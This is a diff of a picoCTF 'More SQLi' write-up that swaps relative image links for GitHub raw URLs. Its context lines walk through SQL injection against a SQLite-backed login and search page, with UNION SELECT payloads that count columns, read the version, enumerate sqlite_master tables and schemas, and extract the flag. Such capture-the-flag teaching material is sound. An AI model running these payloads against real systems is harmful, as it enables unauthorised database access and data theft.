@@ -3,7 +3,7 @@
 At the start, we know that the website uses SQLi.
 
 First input field is for a login and password.  
-![login](imgs/image-2.png)  
+![login](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-2.png)  
 
 After inputing data, it shows us the SQL query it uses, that gives us information that we can use 
 ~~~sql
@@ -16,7 +16,7 @@ This logs us in.
 
 Logging in displays a list of addresses with phone numbers, which are essentially meaningless. We can begin by confirming the number of columns.
 
-![adresses](imgs/image-8.png)
+![adresses](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-8.png)
 
 
 ### Base Exploit  
@@ -37,14 +37,14 @@ So our final command for confirming columns is :
 -1'UNION SELECT 1,2,3--
 ~~~
 
-![columns](imgs/image.png)
+![columns](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image.png)
 
 
 Now it would be good to check version of our sqli_lite DB, we can change our previous command a little bit  
 ~~~sql
 -1' UNION SELECT sqlite_version(),2,3--+
 ~~~
-![version](imgs/image-1.png)
+![version](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-1.png)
 
 Now we can check ExploitDB or google a little bit for finding exploits of this particular version.
 
@@ -64,7 +64,7 @@ For finding tables we shall use :
 -1' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
 ~~~
 
-![tables](imgs/image-3.png)
+![tables](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-3.png)
 
 Then we know, that our tables are  
 `users,offices,hints,more_table`
@@ -75,7 +75,7 @@ After that, we need to gain names of table columns.
 -1' union SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='more_table' --
 ~~~
 
-![columns](imgs/image-6.png)
+![columns](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-6.png)
 
 The output is query that was used to create that table, in our case :
 ~~~sql
@@ -89,6 +89,6 @@ Our final injection is getting the flag from table.
 ~~~sql
 -1' union Select 1,flag,3 from more_table --
 ~~~
-![alt text](imgs/image-7.png)
+![alt text](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-7.png)
 
 
